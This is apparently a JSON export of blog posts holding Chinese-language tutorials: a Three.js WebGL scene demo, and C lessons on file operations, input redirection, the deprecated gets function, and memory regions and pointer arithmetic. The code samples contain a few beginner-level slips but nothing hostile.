溢出隐藏)\n&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;Demo-01&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;Three.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n        body&#123;\n            margin: 0;\n            overflow: hidden;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n\n\n\n\n\n\nThree.Js GitHub地址：点击跳转\n\n\n\n\n\n\n\n\n\nThree.Js API说明文档：点击跳转\n\n\n\n\n\n\n\n\n\n或复制网页端Three.js源码使用：点击跳转\n在 HTML文件中我们要创建容器\n&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;Demo-01&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;Three.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n        body&#123;\n            margin: 0;\n            overflow: hidden;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;div id&#x3D;&quot;webGl-output&quot;&gt;\n\n&lt;&#x2F;div&gt;\n\n&lt;!-- Script --&gt;\n&lt;script&gt;&lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\nWEBGL 三维画面效果的创建(放置在Script标签下)：function init()&#123;\n    &#x2F;&#x2F; 创建场景\n    var scene &#x3D; new THREE.Scene();\n    &#x2F;&#x2F; 设置摄像机 (45度,长宽比&lt;当前屏幕宽&#x2F;屏幕高&gt;,最近可视距离,最远可视距离)\n    var camera &#x3D; new THREE.PerspectiveCamera(45,window.innerWidth&#x2F;window.innerHeight,0.1,2000);\n    &#x2F;&#x2F; 创建渲染器\n    var renderer &#x3D; new THREE.WebGLRenderer();\n    &#x2F;&#x2F; 渲染器初始化颜色\n    renderer.setClearColor(new THREE.Color(0xEEEEEE));\n    &#x2F;&#x2F; 渲染输出 Canvas 画面大小\n    renderer.setSize(window.innerWidth,window.innerHeight);\n    &#x2F;&#x2F; 创建显示卡迪坐标轴\n    var axes &#x3D; new THREE.AxisHelper(20);\n    &#x2F;&#x2F; 添加坐标系到场景\n    scene.add(axes);\n    &#x2F;&#x2F; 场景创建平面(地面几何体)\n    var planeGeometry &#x3D; new THREE.PlaneGeometry(60,20);\n    &#x2F;&#x2F; 设置平面(地面)材质\n    var PlaneMaterial &#x3D; new THREE.MeshBasicMaterial(&#123;color:0xCCCCCC&#125;);\n    &#x2F;&#x2F; 创建地面 通过 THREE.Mesh 进行结合操作\n    var plane &#x3D; new THREE.Mesh(planeGeometry,PlaneMaterial);\n    &#x2F;&#x2F; 物体位移坐标\n    plane.rotation.x &#x3D; -0.5*Math.PI;\n    plane.position.x &#x3D; 15;\n    plane.position.y &#x3D; 0;\n    plane.position.z &#x3D; 0;\n    &#x2F;&#x2F; 将地面添加到场景\n    scene.add(plane);\n    &#x2F;&#x2F; 定位摄影机视角指向场景中心点\n    camera.position.x &#x3D; -30;\n    camera.position.y &#x3D; 40;\n    camera.position.z &#x3D; 30;\n    camera.lookAt(scene.position)\n    &#x2F;&#x2F; 渲染器输出添加至 HTML\n    document.getElementById(&#39;webGl-output&#39;).appendChild(renderer.domElement);\n    &#x2F;&#x2F; 最终渲染\n    renderer.render(scene,camera);\n&#125;\nwindow.onload &#x3D; init    &#x2F;&#x2F; 全部加载完成后运行\n完整实例代码：&lt;!doctype html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;\n    &lt;title&gt;Demo-01&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;libs&#x2F;Three.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n        body&#123;\n            margin: 0;\n            overflow: hidden;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;div id&#x3D;&quot;webGl-output&quot;&gt;\n\n&lt;&#x2F;div&gt;\n\n&lt;!-- Script --&gt;\n&lt;script&gt;\n    function init()&#123;\n        &#x2F;&#x2F; 创建场景\n        var scene &#x3D; new THREE.Scene();\n        &#x2F;&#x2F; 设置摄像机 (45度,长宽比&lt;当前屏幕宽&#x2F;屏幕高&gt;,最近可视距离,最远可视距离)\n        var camera &#x3D; new THREE.PerspectiveCamera(45,window.innerWidth&#x2F;window.innerHeight,0.1,2000);\n        &#x2F;&#x2F; 创建渲染器\n        var renderer &#x3D; new THREE.WebGLRenderer();\n        &#x2F;&#x2F; 渲染器初始化颜色\n        renderer.setClearColor(new THREE.Color(0xEEEEEE));\n        &#x2F;&#x2F; 渲染输出 Canvas 画面大小\n        renderer.setSize(window.innerWidth,window.innerHeight);\n        &#x2F;&#x2F; 创建显示卡迪坐标轴\n        var axes &#x3D; new THREE.AxisHelper(20);\n        &#x2F;&#x2F; 添加坐标系到场景\n        scene.add(axes);\n        &#x2F;&#x2F; 场景创建平面(地面几何体)\n        var planeGeometry &#x3D; new THREE.PlaneGeometry(60,20);\n        &#x2F;&#x2F; 设置平面(地面)材质\n        var PlaneMaterial &#x3D; new THREE.MeshBasicMaterial(&#123;color:0xCCCCCC&#125;);\n        &#x2F;&#x2F; 创建地面 通过 THREE.Mesh 进行结合操作\n        var plane &#x3D; new THREE.Mesh(planeGeometry,PlaneMaterial);\n        &#x2F;&#x2F; 物体位移坐标\n        plane.rotation.x &#x3D; -0.5*Math.PI;\n        plane.position.x &#x3D; 15;\n        plane.position.y &#x3D; 0;\n        plane.position.z &#x3D; 0;\n        &#x2F;&#x2F; 将地面添加到场景\n        scene.add(plane);\n        &#x2F;&#x2F; 定位摄影机视角指向场景中心点\n        camera.position.x &#x3D; -30;\n        camera.position.y &#x3D; 40;\n        camera.position.z &#x3D; 30;\n        camera.lookAt(scene.position)\n        &#x2F;&#x2F; 渲染器输出添加至 HTML\n        document.getElementById(&#39;webGl-output&#39;).appendChild(renderer.domElement);\n        &#x2F;&#x2F; 最终渲染\n        renderer.render(scene,camera);\n    &#125;\n    window.onload &#x3D; init    &#x2F;&#x2F; 全部加载完成后运行\n&lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;","slug":"ThreeJsWebGL_2022_4.19.01","date":"2022-04-19T06:46:00.000Z","categories_index":"程序","tags_index":"教学文档,博客网站","author_index":"Arvin"},{"id":"4bf8b9a001bc016f6215f57ed0fd32d2","title":"C语言文件操作","content":"未完\n6.0 文件基本操作对文件的操作我们所要采用指针，C语言创建之初是为了写unix系统，也就是后来的Linux系挺，它对文件是流的操控。需要注意，如果使用完需要：fclose();fclose 不光是关闭文件，还会把缓冲区的内容写入到文件。缓冲区的作用：缓冲区的作用实际上是用来包含我们的硬件的。所有的磁盘都是有寿命限制的，每次读写对磁盘是有伤害的。缓冲区是先集合要写的内容，然后统一写入进去\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main(void) &#123;\n\nFILE* fp &#x3D; NULL;        &#x2F;&#x2F; 可以将指针变量看成一个钥匙\nfp &#x3D; fopen(&quot;FILE\\\\Hello.txt&quot;, &quot;w+&quot;);        &#x2F;&#x2F; 第一个参数是&quot;文件路径和文件名称&quot; 第二个参数是模式 开门\nif (fp &#x3D;&#x3D; NULL) &#123;\nreturn -1;\n&#125;\n\nfclose(fp);        &#x2F;&#x2F; 关门\nfp &#x3D; NULL;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\nfopen() 的模式字符串fopen()参数说明：第一个参数是文件名称或文件路径，第二个则是文件模式字符串。\n\n\n\n模式字符串\n含义\n\n\n\n“r”\n以读的模式打开文件\n\n\n“w”\n以写的模式打开文件，把现有文件的长度截为0（清除内容），如果文件不存在，则创建一个新文件\n\n\n“a”\n以写的模式打开文件，在现有文件末尾添加内容，如果文件不存在，则创建一个新文件\n\n\n“r+”\n以更新模式打开文件（即可以读写文件）\n\n\n“w+”\n以更新模式打开文件（即，读和写），如果文件存在，则将其长度截为0（清楚内容），如果文件不存在，则创建一个新文件\n\n\n“a+”\n以更新模式打开文件（即，读和写），在现有文件的末尾添加内容，如果文件不存在，则创建一个新文件；可以读整个文件，但只能从尾部添加内容。\n\n\n“rb”、”wb”、”ab”、”ab+”、”a+b”、”wb+”、”w+b”、”ab+”、”a+b”\n以上个模式类似，但是以二进制模式，而不是文本模式打开文件\n\n\n“wx”、”wbx”、”w+x”、”wb+x”或”w+bx”\n（C11）类似非x模式，但是如果文件已经存在或以独占模式打开文件，则打开文件失败。\n\n\n6.0.1 文件写入内容和文件缓冲区#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main(void) &#123;\nFILE* pf &#x3D; NULL;\npf &#x3D; fopen(&quot;FILE\\\\World.txt&quot;, &quot;w+&quot;);\n\nif (pf &#x3D;&#x3D; NULL) &#123;\nreturn -1;\n&#125;\n\nfputs(&quot;Hello World&quot;, pf);\n\n&#x2F;&#x2F; 断点 去文件里看看有没有数据，这样就可以看缓冲区\n\n&#x2F;**\n*        fputs不是把内容写入文件当中，而是写入到缓冲区。\n*        fclose 不光是关闭文件，还会把缓冲区的内容写入到文件。\n*        缓冲区的作用：\n*        缓冲区的作用实际上是用来包含我们的硬件的。\n*        所有的磁盘都是有寿命限制的，每次读写对磁盘是有伤害的。\n*        缓冲区是先集合要写的内容，然后统一写入进去\n*&#x2F;\n\nfclose(pf);\npf &#x3D; NULL;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n6.0.2 文件重定向标准输入和标准输出C的出现就是为了写系挺就是unix诞生的后来unix发展出众多系统(linux)而系统操作最多的就是文件，以前用C语言的开发者都说一切皆是文件，这句话是对的。因为C特殊就特殊在它把输入输出都当作文件，输入输出就是键盘和屏幕。C语言把所有的东西都看作是一个文件。把键盘看作一个文件，把屏幕也看作是一个文件。打印机也看作一个文件，C语言的世界里只有文件。重定向就是无论你是什么(软件|硬件),都可以相互转换。重定向就是本来该显示在这里的东西可以显示在另一个地方。重点：C语言一切皆文件。\n文件重定向Unix、Linux和当前的 DOS 版本都能够重定向输入和输出。输入重定向可以使程序能够使用文件代替键盘作为输入，输出重定向则使程序能够使用文件代替屏幕输出。输出重定向就是用文本文件代替屏幕当作程序的输出，”&gt;” 运算符是另一个重定向运算符。假设我们要将键盘输入的数据发送至一个名为Test,.txt的文件。通过下面这条语句就可以完成：Reput.exe&gt; Test.text。该运算符会导致建立一个名为Test.txt的新文件供我们使用，然后将Reput.exe的输出（也就是说，我们嵌入的字符的副本）重定向到该文件。该重定向将stdout从显示设备（屏幕）重定向到Test.txt文件。如果你已经有一个名为Test.txt的文件，则通常会删除该文件，然后再用新的文件代替。\n重定向要点重定向运算符是将一个可执行程序与一个数据文件链接起来，该运算符不能用于一个数据文件与另一个数据文件的链接，也不能用于一个程序和另一个程序的链接。使用这些运算符时，输入不能来自一个以上的文件，输出也不能定向至一个以上的文件。“&gt;&gt;” 运算符用累加的方法将数据输出到指定的文件上，不会覆盖已经有的数据，是在原基础上追加数据。\ngets 函数的作用gets用来从标准设备读取字符并存放到参数s所指向的内存空间，直到出现换行字符或读到文件尾为止。注意该函数目前C语言不推介使用了。C99 标准时候，委员会认为这个函数过于危险，很容易造成内存泄露（char ch[10] &#x3D; {0}; 在控制台输入大于定义的值它不会报错，运行完成后程序会自动崩溃），但以前的C语言代码都是用了这个函数，如果不用了，以前的代码就无法维护了，所以委员会支持该函数，但不建议使用。C11 标准认为可以废弃以前的代码将这个函数废弃。C11 建议放弃。但目前gets这个函数并没有废弃，还是可以使用，但建议放弃，C11 委员会推出了fgets供用户使用。（哈哈哈，C语言标准每年都很逗）\n6.0.3 文件重定向二C语言把所有的设备当做文件来处理C语言在进行文件操作时遵循如下步骤：打开-&gt; 读写操作-&gt; 关闭C语言在程序中建立一个文件，本身就是结构体，然后返回的是一个结构体指针，文件指针是由操作系统来管理的。\n文件指针的详细信息FILE 类型详细底层实现\n&#x2F;**\n*        C语言通过该结构体描述文件\n*&#x2F;\n\nstruct _iobuf &#123;\nchar* _ptr;                &#x2F;&#x2F; 当前缓冲区内容指针\nint _cnt;                &#x2F;&#x2F; 缓冲区还有多少字符\nchar* _base;        &#x2F;&#x2F; 缓冲区的起始地址\nint _flag;                &#x2F;&#x2F; 文件流的状态，是否错误或结束\nint _file;                &#x2F;&#x2F; 文件描述符\nint _charbuf;        &#x2F;&#x2F; 双字节缓存，缓存两个字节\nint _bufsiz;        &#x2F;&#x2F; 缓冲区大小\nchar* _tmpfname;&#x2F;&#x2F; 临时文件名\n&#125;;\ntypedef struct _iobuf FILE;\n标准输入与标准输出通俗来说，打开是获取文件结构、系统为文件分配缓存中的过程，不打开文件就不能对其进行读写，关闭是释放缓冲区和其他资源的过程，不关闭文件就会慢慢耗光系统资源。我们在进行文件操作时，系统自动与3个标准设备文件联系，这3个文件无需打开和关闭，它们的文件指针分别是：stdin：标准输入文件指针，系统分配为键盘。stdout：标准输出文件指针，系统分配为显示器。stderr：标准错误输出文件指针，系统分配为显示器。\ngets 函数废弃的原因gets() 函数简单易用，它读取整行输入，直至遇到换行符，然后丢弃换行符，储存其余字符，并在这些字符的末尾添加一个空字符”\\0”，使其成为一个c字符串。它经常和puts函数配对使用。该函数用于显示字符串，并在末尾添加换行符。\n问题在于gets()唯一一个参数是words，它无法检查数组是否装得下输入行，之前示例说过，数组名会被转换成数组的首元素的地址，因此gets()函数只知道数组的开始处，并不知道数组中可以放多少个元素。\n如果输入的字符串过长，会导致缓冲区溢出（buffer overflow），即多余的字符超出了指定的目标控件。\nfgets函数和gets函数的区别fgets函数通过第二个参数限制读取字符的最大数量，如果该参数的值为n，那么fgets()将读入n-1个字符，或者读取遇到的第一个换行符为止。fgets()函数读取到一个换行符，会把它存储在字符串中。这点与gets不同，gets()会丢弃换行符。fgets()函数的第三个参数指明要读取的文件。如果读入从键盘输入的数据，则以stdin（标准输入）作为参数，该标识符定义在stdio.h文件中。\nfgets()函数的语法：fgets 是gets的替换版，三个参数：内存地址、可存储最大字节数、文件流fgets(ch, 10, stdin);这里第一个ch是我们用指针绑定的数组获取的数组指针，10则是绑定数组的数组大小，stdin是标准输入即表示键盘。对应的还有一个输出叫：fputs()函数。\n6.0.4 文件读取fgetc 读取字符从文件中读取一个字符，fgetc 只能读取窄字符。\nfeof的作用检查文件流是否读到了文件尾。函数说明：feof用来检测是否读取到了文件尾，尾数stream 为 fopen() 所返回的文件指针。如果已经到文件尾，则返回非零值，其他情况返回0。返回值：返回非零值代表已经到达文件末尾使用前面加上非。\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main(void) &#123;\nchar ch &#x3D; 0;\nFILE* fp &#x3D; fopen(&quot;FILE\\\\World.txt&quot;, &quot;r&quot;);\nif (fp &#x3D;&#x3D; NULL) &#123;\nreturn -1;\n&#125;\n\nwhile (!feof(fp)) &#123;\nch &#x3D; fgetc(fp);        &#x2F;&#x2F; 获取，它一次只能读取一个字符\nprintf(&quot;%c&quot;, ch);\n&#125;\n\nfclose(fp);\nfp &#x3D; NULL;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n6.0.5 C语言获取文件大小获取文件大小方法一：简单不建议使用（容易出错）#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;\nvoid main68(void) {char ch &#x3D; 0;FILE* fp &#x3D; fopen(“FILE\\World.txt”, “r”);if (fp &#x3D;&#x3D; NULL) {return -1;}int i &#x3D; 0;\nwhile (!feof(fp)) {ch &#x3D; fgetc(fp);        &#x2F;&#x2F; 获取，它一次只能读取一个字符printf(“%c”, ch);i++;}\nfclose(fp);fp &#x3D; NULL;pringtf(“%d\\s”,i);\nprintf(“\\n”);system(“pause”);}获取文件大小方法二\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main(void) &#123;\n\nFILE* pf &#x3D; fopen(&quot;FILE\\\\World.txt&quot;, &quot;rb&quot;);\n\nif (pf &#x3D;&#x3D; NULL) &#123;\nreturn -1;\n&#125; else &#123;\n&#x2F;* 0代表偏移量 *&#x2F;\nfseek(pf, 0, SEEK_END);        &#x2F;&#x2F; 文件指针移动到末尾\nint length &#x3D; ftell(pf); &#x2F;&#x2F; 获取当前文件指针距离开头的长度\nfclose(pf);\nprintf(&quot;%d\\n&quot;, length);\npf &#x3D; NULL;\nreturn length;\n&#125;\n\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125; \nfseek 的作用fseek() 用来移动文件流的读写位置。参数stream为已打开的文件指针，参数offset为根据参数whence来移动读写位置的位移数。参数whence为下列其中一种：SEEK_SET：从距文件开头，offset位移量为新的读写位置。SEEK_CUR：以目前的读写位置往后增加offset个位移量。SEEK_END：将读写位置指向文件尾后再增加offset个位移量。\n当whence值为SEEK_CUR或SEEK_END时，参数offset允许负值出现，下列是比较特别的使用方式：欲将读写位置移动到文件开头时：fseek(FILE* stream,0,SEEK_SET)欲将读写位置移动到文件尾时：fseek(FILE* stream,0,SEEK_END);\n函数返回值当调用成功则返回0，若有错误则返回-1，error会存放错误代码\n附加说明：fseek()不像lseek()会返回读写位置，因此必须使用ftell()来取得目前读写的位置。\n","slug":"C_2022_3.21.01","date":"2022-03-21T05:20:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"df0891c5a177e6815a3b34e9b175010e","title":"C语言指针(下)","content":"5.1.0 内存四区模型操作系统把物理硬盘代码 load 到内存。操作系统把C代码分成四个区。操作系统找到Main函数入口执行。\n内存四区一个由C&#x2F;C++编译的程序占用的内存分成以下几个部分：栈区（stack）：由编译器自动分配释放，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。只有汇编语言可以操控栈区。\n堆区（heap）：一般由程序员分配释放，若程序员不释放，程序结束时可能操作系统回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。\n数据区：主要包括静态全局区和常量区，如果要站在汇编的角度细分的话，还可以分为很多小区。\n全局区（静态区）（static）：全局变量和静态变量的存储放在一块的，初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。程序结束后由系统释放。常量区也存在于全局区（他们统称）。\n常量区：常量字符串就是放在这里的，程序结束后由系统释放。\n代码区：存放函数体的二进制代码。由操作系统管理，函数指针最强大的地方就是可以操作代码区的数据。\n全局区详解#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;Windows.h&gt;\n\nchar* pMem1();        &#x2F;&#x2F; 函数指针\nchar* pMem2();\nchar* pMem3();\n\nvoid main(void) &#123;\nchar* p1 &#x3D; NULL;        &#x2F;&#x2F;声明两个指针变量\nchar* p2 &#x3D; NULL;\nchar* p3 &#x3D; NULL;\np1 &#x3D; pMem1();        &#x2F;&#x2F; 接收函数指针传出的指针变量值\np2 &#x3D; pMem2();\np3 &#x3D; pMem3();\n\nprintf(&quot;p1 &#x3D; %s p1 &#x3D; %p\\n&quot;, p1, p1);\nprintf(&quot;p2 &#x3D; %s p2 &#x3D; %p\\n&quot;, p2, p2);\nprintf(&quot;p3 &#x3D; %s p3 &#x3D; %p\\n&quot;, p3, p3);\nsystem(&quot;pause&quot;);\n&#125;\n\nchar* pMem1() &#123;\n&#x2F;**\n*        两个不同的函数定义了一个相同的字符串，地址一样吗？\n*        是一样的，实际上它存储的是字符串的地址，栈区运行完毕就自动销毁了，实际上这两个函数是一样的只是函数名不一样\n*        同样的东西，为什么要创建两次呢？设计者也不是傻子。\n*        例如有一个货物放在哪里不动了，这个时候他们两个人分别去记录这个货物的位置。\n*        栈区上的变量执行完毕变量就销毁了\n*&#x2F;\nchar* p1 &#x3D; &quot;Hello World&quot;;        &#x2F;&#x2F; 存储在全局区\nreturn p1;        &#x2F;&#x2F; 返回一个指针变量\n&#125;\n\n&#x2F;&#x2F; 函数调用完毕，内存销毁\nchar* pMem2() &#123;\n&#x2F;**\n*        Hello Arvin 这个字符串怎么传入到这个指针的呢？指针变量在32Bit下是4字节，64Bit下是8字节。\n*        指针变量存储的只存储的是它的地址，变量实际在全局区。\n*&#x2F;\nchar* p2 &#x3D; &quot;Hello World&quot;;\nreturn p2;\n&#125;\n\nchar* pMem3() &#123;\n&#x2F;&#x2F; 如果货物不一样，那么他们的地址就不一样。\nchar* p3 &#x3D; &quot;Hello Arvin&quot;;\nreturn p3;\n&#125;\n总结：全局区相同字符串常量合并。注意三点：栈区调用完毕就销毁了。指针指向谁就把谁的地址赋值给指针。%s 的意思就是打印地址所指向的内容。\n栈区详解#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nchar* p_str();\n\nvoid main() &#123;\n\nchar* p &#x3D; NULL;\np &#x3D; p_str();\n\nprintf(&quot;P &#x3D; %s\\n&quot;, p);        &#x2F;&#x2F; 数组的首地址 \n\n&#x2F;**\n*  那么p打印这个地址所队友的内存空间内容是不是 Hello 答案是否因为已经被栈销毁了\n*  说明：p_str在栈区创建一块100字节的空间，&quot;Hello&quot; 还是存放在全局区。\n*  p_str是一个数组，复制了全局变量的内容，拷贝了一份在栈上和地址无关。\n*  当p_str函数执行完毕后，将p_str的地址返回给Main的p，然后p_str会自动销毁。所以无法输出获取 Hello。\n*&#x2F;\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n\nchar* p_str() &#123;\nchar str[100] &#x3D; &quot;Hello&quot;;        &#x2F;&#x2F; 4字节\nprintf(&quot;str &#x3D; %s\\n&quot;,str);\nreturn str;\n&#125;\n内存栈区调试\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        两个函数声明同一个变量，这两个变量有关系吗？ ：没有\n*&#x2F;\n\nchar* p_str2();\n\nvoid main(void) &#123;\n\nchar* p &#x3D; NULL;\np &#x3D; p_str2();\n\nprintf(&quot;p &#x3D; %s\\n&quot;, p);\nprintf(&quot;p &#x3D; %p\\n&quot;, p);\n\n&#x2F;&#x2F; 在这里再打一个断点运行查看内存\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n\nchar* p_str2() &#123;\nchar str[100] &#x3D; &quot;Hello&quot;;\nprintf(&quot;str &#x3D; %s\\n&quot;, str);\nprintf(&quot;str &#x3D; %p\\n&quot;, str);\n&#x2F;&#x2F; 查看栈销毁，在这里打一个断点\nreturn str;\n&#125;\n所以在栈上开辟一个数组是很危险的，所以我们一般在堆上开辟数组。堆是由我们控制的所以在使用完成后要手动释放。\n堆区详解strcpy 函数的作用原型声明：charstrcpy(char dest,const char* src);功能：把从src地址开始且含有NULL结束符的字符串复制到以dest开始的地址空间。说明：stc和dest所指内存区域不可以重叠，且dest必须有足够的空间来容纳src的字符串。返回指向dest的指针。\n堆区不会自动释放需要手动释放。Free 的意思不是清空内存，而是解除这个指针的绑定关系（解除和这块内存的绑定关系），原先只有指针自己能调用，（取消绑定后）现在谁都可以用。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        运行流程说明：\n*        首先在栈区创建了指针p，现在指针p为NULL；\n*        然后执行phead函数，它入栈，创建了一个指针tmp(存储堆区的地址)。在堆区创建了一个100字节大小的空间。\n*        strcpy拷贝Hello到堆区。然后将tmp(堆区地址)返回给main函数中创建的p，栈区销毁phead指针函数。\n*        p接收到堆区的地址，进行判断，如果不为NULL，就打印出它指针指向的地址的内容。\n*        然后解除指针变量p和堆内存的绑定关系。将指针变量p置空。\n*&#x2F;\n\nchar* phead();\n\nvoid main(void) &#123;\nchar* p &#x3D; NULL;\np &#x3D; phead();\nprintf(&quot;p &#x3D; %p\\n&quot;, p);\nprintf(&quot;p &#x3D; %s\\n&quot;, p);\nif (p !&#x3D; NULL) &#123;        &#x2F;&#x2F; 如果p接收到的不为NULL，就打印出它指针指向地址的内容\nprintf(&quot;%s\\n&quot;, p);\n&#x2F;&#x2F; 断点\nfree(p);        &#x2F;&#x2F; 解除指针变量p和堆内存的绑定关系。\np &#x3D; NULL;        &#x2F;&#x2F; 将指针变量p置空\n&#125;\n&#x2F;&#x2F; 断点\nsystem(&quot;pause&quot;);\n&#125;\n\nchar* phead() &#123;\nchar* tmp &#x3D; (char*)malloc(100);        &#x2F;&#x2F; 在堆上开辟了100字节的空间\nif (tmp &#x3D;&#x3D; NULL) &#123;        &#x2F;&#x2F; 如果tmp为空那么就返回一个空的值。\nreturn NULL;\n&#125;\nstrcpy(tmp, &quot;Hello&quot;);        &#x2F;&#x2F; strcpy拷贝函数，我们将Hello拷贝到tmp指向的空间(我们在堆里开辟的空间)\nprintf(&quot;tmp &#x3D; %p\\n&quot;, tmp);\nprintf(&quot;tmp &#x3D; %s\\n&quot;, tmp);\n&#x2F;&#x2F; 断点\nreturn tmp;\n&#125;\n\n5.1.2 指针运算（重点）指针的加减法,它是处理多级指针包括数组的时候非常重要。它决定了你在指针这里能走多远。严格来说，指针很少有人走到头。至少要掌握二级指针到三级指针（否则你将很难明白C++语言中的引用）。void *p是一个万能指针。\n指针的数据类型决定了指针的解析方式，同时也决定了指针的步长。指针+1等于指针加上所指向类型的大小。编译器对指针+1的操作：p+sizeof（p）1；\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;&#x2F;51\nvoid main() &#123;\nint num &#x3D; 10;\nint* p &#x3D; &amp;num;\nprintf(&quot;%p %p\\n&quot;, p, p + 1);        &#x2F;&#x2F; 指针是4|8字节，指针+1 &#x3D; +4字节\nprintf(&quot;%d %d\\n&quot;, p, p + 1);        &#x2F;&#x2F; 证实指针+1 &#x3D; +4 注意：指针+1 等于指针所指向类型的大小\n\nchar str &#x3D; &#39;a&#39;;\nchar* p_str &#x3D; &amp;str;\n&#x2F;&#x2F; 指针+1在编译器实际是：p+sizeof(*p)*1\nprintf(&quot;%p %p\\n&quot;, p_str, p_str + 1);        &#x2F;&#x2F; 这里指针+1 &#x3D; +1字节 因为char是一个字节\nprintf(&quot;%d %d\\n&quot;, p_str, p_str + 1);\n\n&#x2F;**\n*        既然指针都是4|8字节，那么为什么要有类型呢？注意：void *p 是万能指针。\n*        其实指针变量的类型决定了解析的方式，声明什么类型的变量就要用什么类型的指针变量。\n*        如果用错了会出现错误，类型不单单决定了步长，还决定了解析方式。\n*        步长：+1加多少就是步长。指针的类型决定了指针的步长(往前走几个字节)\n*        类型相当于模具，变量相当于做出的模型，如果模具不一样做做出来的模具肯定会出现问题。\n*&#x2F;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n指针与数组练习指针也是一种数据类型，指针的数据类型是指它所指向的内存空间的数据类型。指针的空间和指针所指向的内存空间是不同概念。下面实例比较复杂建议多看内存和多思考。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nchar str[] &#x3D; &quot;Hello&quot;;\n\n&#x2F;&#x2F; 字符串是以\\0结尾的所以是6个字节 或者智能去判断\n&#x2F;*for (int i &#x3D; 0; i &lt; sizeof(str); i++) &#123;\nprintf(&quot;%c&quot;, str[i]);\n&#125;\nprintf(&quot;\\n\\n&quot;);*&#x2F;\n\n&#x2F;* 我们采用指针的方式打印 *&#x2F; &#x2F;&#x2F; 这里断点调试，注释上面for内容\nfor (char* p_str &#x3D; str; p_str &lt; str + 3; p_str++) &#123;\nprintf(&quot;%c&quot;, *p_str);\n&#125;\n&#x2F;**\n*        for(指针绑定地址，指针小于数组字符串，p_str++(步长))\n*        数组+1是加了本身一个元素的大小\n*        p_str+1是加了指向类型的大小\n*        指针变量和数组的起始点是一样的，步长也是一样的\n*        所以值也一样\n*&#x2F;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n指针的间接赋值如果想通过形参改变实参的内存内容（值）必须地址传递。指针间接赋值的三个条件两个变量、建立关系、通过*操作内存\n#include 